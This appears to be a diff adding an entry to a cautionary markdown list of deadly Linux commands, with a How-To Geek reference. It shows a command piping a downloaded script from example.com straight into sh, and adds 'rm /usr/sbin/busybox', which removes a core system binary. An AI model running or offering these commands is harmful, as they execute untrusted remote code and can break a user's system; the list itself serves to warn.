@@ -50,5 +50,10 @@ Redirecting will write raw bytes on your disk partition. What can never will be?
 `wget http://example.com/something -O – | sh –`
 
 
+## You will be no more busy
+
+`rm /usr/sbin/busybox`
+
+
 ## References
 * [How to Geek](http://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/)
